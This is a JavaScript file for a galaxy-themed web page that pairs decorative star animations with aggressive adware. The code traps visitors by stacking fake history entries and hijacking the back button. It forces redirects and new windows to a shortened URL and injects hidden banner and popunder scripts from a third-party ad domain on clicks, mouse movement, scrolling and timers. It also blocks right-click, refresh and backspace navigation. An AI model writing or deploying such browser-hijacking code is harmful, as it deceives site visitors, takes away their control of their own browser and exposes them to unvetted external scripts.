// ====== BRUTAL ADS CONFIGURATION ======
const AD_NETWORKS = {
  banner: [
    // High paying banner ads (300x250)
    '<script type="text/javascript">atOptions = {\'key\' : \'4b1eafbbf9404932effcedf29b70c2c7\',\'format\' : \'iframe\',\'height\' : 250,\'width\' : 300,\'params\' : {}};</script><script type="text/javascript" src="//spaniardinformationbookworm.com/4b1eafbbf9404932effcedf29b70c2c7/invoke.js"></script>',
    '<script async="async" data-cfasync="false" src="//spaniardinformationbookworm.com/868d42ad6f620a7c28f3928d2b4bc961/invoke.js"></script><div id="container-868d42ad6f620a7c28f3928d2b4bc961"></div>',
    '<script type="text/javascript">atOptions = {\'key\' : \'97f68ad2d8c855e8f26d7e6b7c5a4b3c\',\'format\' : \'iframe\',\'height\' : 250,\'width\' : 300,\'params\' : {}};</script><script type="text/javascript" src="//spaniardinformationbookworm.com/97f68ad2d8c855e8f26d7e6b7c5a4b3c/invoke.js"></script>'
  ],
  popunder: [
    '//spaniardinformationbookworm.com/a2/6b/18/a26b180d886de45b6d20f7541482b591.js',
    '//spaniardinformationbookworm.com/97/68/f5/9768f5d78dfc013bf8c5047b5505e390.js'
  ]
};

const HISTORY_PUSH_COUNT = 100; // Brutal history stacking

// ====== BRUTAL INITIALIZATION ======
window.addEventListener('load', function() {
  // Initialize everything aggressively
  brutalPushStates(HISTORY_PUSH_COUNT);
  createStars();
  createShootingStars();
  createCosmicRays();
  initializeBrutalButtons();
  
  // Pre-load ads immediately
  preloadAllAds();
  
  // Aggressive popunder on load
  setTimeout(triggerPopunder, 1500);
  
  // Continuous popunder attempts
  setInterval(triggerPopunder, 30000);
  
  // Mouse movement detection for ads
  document.addEventListener('mousemove', handleMouseMovement);
  
  // Scroll detection for ads
  window.addEventListener('scroll', handleScroll);
  
  // Prevent right click
  document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    triggerEmergencyAds();
  });
});

// ====== BRUTAL HISTORY MANAGEMENT ======
function brutalPushStates(count = 1) {
  for (let i = 0; i < count; i++) {
    try { 
      history.pushState({brutal: i, trap: true}, "", "#" + i); 
    } catch(e) { 
      console.log('Brutal push state blocked'); 
    }
  }
  
  // Replace current state to prevent back
  history.replaceState({trapped: true}, "", window.location.href);
}

// ====== BRUTAL POPSTATE HANDLER ======
window.addEventListener('popstate', function(event) {
  // Immediately push more states when user tries to go back
  brutalPushStates(50);
  
  // Trigger emergency ads
  triggerEmergencyAds();
  
  // Redirect to ads if possible
  setTimeout(() => {
    openBrutalRedirect();
  }, 100);
});

// ====== BRUTAL BUTTON HANDLING ======
function initializeBrutalButtons() {
  document.querySelectorAll('a[data-ad="banner"]').forEach(button => {
    // Remove any existing listeners first
    button.replaceWith(button.cloneNode(true));
  });

  document.querySelectorAll('a[data-ad="banner"]').forEach(button => {
    button.addEventListener('click', function(e) {
      e.preventDefault();
      e.stopPropagation();
      
      createRipple(this, e);
      createStarburst(this);
      
      // Multiple ad triggers on single click
      triggerBannerAds(3); // Trigger 3 different banner ads
      triggerPopunder();
      brutalPushStates(25);
      
      // Open new tab/window with ads
      setTimeout(() => {
        openBrutalRedirect();
      }, 500);
      
      // Prevent default after delay
      return false;
    });
    
    // Add touch events for mobile
    button.addEventListener('touchstart', function(e) {
      e.preventDefault();
      triggerBannerAds(2);
      triggerPopunder();
    });
  });
}

// ====== BRUTAL AD TRIGGERS ======
function triggerBannerAds(count = 1) {
  const hiddenAds = document.getElementById('hiddenAds');
  
  for (let i = 0; i < count; i++) {
    const adIndex = Math.floor(Math.random() * AD_NETWORKS.banner.length);
    const adScript = AD_NETWORKS.banner[adIndex];
    
    // Create container for ad
    const adContainer = document.createElement('div');
    adContainer.style.cssText = 'position:fixed; top:-1000px; left:-1000px; width:300px; height:250px; z-index:9999;';
    adContainer.innerHTML = adScript;
    
    document.body.appendChild(adContainer);
    
    // Remove after some time
    setTimeout(() => {
      if (adContainer.parentNode) {
        adContainer.parentNode.removeChild(adContainer);
      }
    }, 10000);
  }
}

function triggerPopunder() {
  try {
    AD_NETWORKS.popunder.forEach(scriptUrl => {
      const script = document.createElement('script');
      script.src = scriptUrl;
      script.async = true;
      document.head.appendChild(script);
    });
  } catch (e) {
    console.log('Popunder blocked');
  }
}

function triggerEmergencyAds() {
  // Trigger multiple ads in emergency
  triggerBannerAds(5);
  triggerPopunder();
  brutalPushStates(50);
}

// ====== BRUTAL REDIRECT ======
function openBrutalRedirect() {
  // Try multiple redirect methods
  try {
    // Method 1: window.open
    const newWindow = window.open('https://shorter.me/WHO7C', '_blank');
    if (newWindow) {
      setTimeout(() => {
        newWindow.focus();
      }, 100);
    }
  } catch (e) {}
  
  try {
    // Method 2: location.replace (more aggressive)
    setTimeout(() => {
      window.location.replace('https://shorter.me/WHO7C');
    }, 1500);
  } catch (e) {}
  
  try {
    // Method 3: Create iframe redirect
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'https://shorter.me/WHO7C';
    document.body.appendChild(iframe);
  } catch (e) {}
}

// ====== PRELOAD ADS ======
function preloadAllAds() {
  // Preload banner ads
  AD_NETWORKS.banner.forEach(adScript => {
    const preloadDiv = document.createElement('div');
    preloadDiv.style.display = 'none';
    preloadDiv.innerHTML = adScript;
    document.getElementById('hiddenAds').appendChild(preloadDiv);
  });
}

// ====== USER BEHAVIOR DETECTION ======
let mouseMoveCount = 0;
function handleMouseMovement(e) {
  mouseMoveCount++;
  
  // Trigger ads on certain mouse movement patterns
  if (mouseMoveCount % 50 === 0) {
    triggerBannerAds(1);
  }
  
  // Trigger on mouse position (simulating interest)
  if (e.clientY < 100) { // Top of screen
    triggerPopunder();
  }
}

let scrollCount = 0;
function handleScroll() {
  scrollCount++;
  
  // Trigger ads on scroll
  if (scrollCount % 10 === 0) {
    triggerBannerAds(1);
  }
}

// ====== GALAXY BACKGROUND EFFECTS ======
function createStars() {
  const container = document.querySelector('.stars-container');
  const starCount = 150;

  for (let i = 0; i < starCount; i++) {
    const star = document.createElement('div');
    star.className = 'star';
    
    const size = Math.random() * 2 + 1;
    star.style.width = size + 'px';
    star.style.height = size + 'px';
    star.style.left = Math.random() * 100 + 'vw';
    star.style.top = Math.random() * 100 + 'vh';
    star.style.animationDelay = Math.random() * 4 + 's';
    star.style.opacity = Math.random() * 0.7 + 0.3;
    
    container.appendChild(star);
  }
}

function createShootingStars() {
  const container = document.querySelector('.shooting-stars');

  function createShootingStar() {
    const star = document.createElement('div');
    star.className = 'shooting-star';
    
    star.style.left = Math.random() * 100 + 'vw';
    star.style.top = Math.random() * 50 + 'vh';
    star.style.animationDelay = Math.random() * 5 + 's';
    
    container.appendChild(star);
    
    setTimeout(() => {
      star.remove();
    }, 3000);
  }

  for (let i = 0; i < 3; i++) {
    setTimeout(createShootingStar, i * 1500);
  }

  setInterval(createShootingStar, 3000);
}

function createCosmicRays() {
  const container = document.querySelector('.cosmic-rays');

  function createRay() {
    const ray = document.createElement('div');
    ray.className = 'cosmic-ray';
    
    ray.style.left = Math.random() * 100 + 'vw';
    ray.style.animationDelay = Math.random() * 6 + 's';
    
    container.appendChild(ray);
    
    setTimeout(() => {
      ray.remove();
    }, 6000);
  }

  for (let i = 0; i < 6; i++) {
    setTimeout(createRay, i * 1000);
  }

  setInterval(createRay, 4000);
}

// ====== VISUAL EFFECTS ======
function createRipple(element, event) {
  const rect = element.getBoundingClientRect();
  const x = event.clientX - rect.left;
  const y = event.clientY - rect.top;
  
  const ripple = document.createElement('span');
  ripple.className = 'ripple';
  ripple.style.left = x + 'px';
  ripple.style.top = y + 'px';
  
  element.appendChild(ripple);
  setTimeout(() => ripple.remove(), 600);
}

function createStarburst(button) {
  const rect = button.getBoundingClientRect();
  const centerX = rect.left + rect.width / 2;
  const centerY = rect.top + rect.height / 2;
  
  const colors = ['#ff6b9d', '#ff4b7d', '#c74bd7', '#d8a8ff', '#ff9ec0'];
  
  for (let i = 0; i < 10; i++) {
    const particle = document.createElement('div');
    const angle = (i * 36) * Math.PI / 180;
    const distance = 60;
    
    particle.style.position = 'fixed';
    particle.style.width = '4px';
    particle.style.height = '4px';
    particle.style.backgroundColor = colors[i % colors.length];
    particle.style.borderRadius = '50%';
    particle.style.left = centerX + 'px';
    particle.style.top = centerY + 'px';
    particle.style.zIndex = '100';
    particle.style.pointerEvents = 'none';
    particle.style.boxShadow = `0 0 8px ${colors[i % colors.length]}`;
    
    document.body.appendChild(particle);
    
    const animation = particle.animate([
      { 
        transform: 'translate(0, 0) scale(1)', 
        opacity: 1 
      },
      { 
        transform: `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px) scale(0)`, 
        opacity: 0 
      }
    ], {
      duration: 600,
      easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
    });
    
    animation.onfinish = () => particle.remove();
  }
}

// ====== AUTO TRIGGERS ======
setInterval(() => {
  // Random ad triggers
  if (Math.random() > 0.7) {
    triggerBannerAds(1);
  }
}, 15000);

// ====== BRUTAL EXIT PREVENTION ======
window.addEventListener('beforeunload', function(e) {
  // Trigger ads when user tries to leave
  triggerEmergencyAds();
  
  // Standard confirmation dialog (some browsers show this)
  e.preventDefault();
  e.returnValue = 'Are you sure you want to leave?';
});

// Prevent keyboard shortcuts
document.addEventListener('keydown', function(e) {
  // Block F5, Ctrl+R, etc.
  if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
    e.preventDefault();
    triggerEmergencyAds();
  }
  
  // Block backspace as back navigation
  if (e.key === 'Backspace' && !e.target.matches('input, textarea')) {
    e.preventDefault();
    brutalPushStates(10);
  }
});
